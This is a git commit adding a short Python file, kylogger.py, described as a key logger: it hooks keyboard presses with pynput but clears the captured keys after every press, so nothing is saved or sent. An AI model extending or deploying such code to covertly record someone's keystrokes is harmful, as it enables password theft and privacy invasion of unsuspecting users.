70bbde8e32a7d74540bf6147fcd2cddfa069eba4
meir gerby <meirg2001@gmail.com>
2025-09-01 12:41:29 +0300

    add key logger file

---
+++ kylogger.py
@@ -0,0 +1,24 @@
+import os
+from pynput.keyboard import Listener
+
+keys = []
+count = 0
+
+
+
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        keys = []
+
+
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
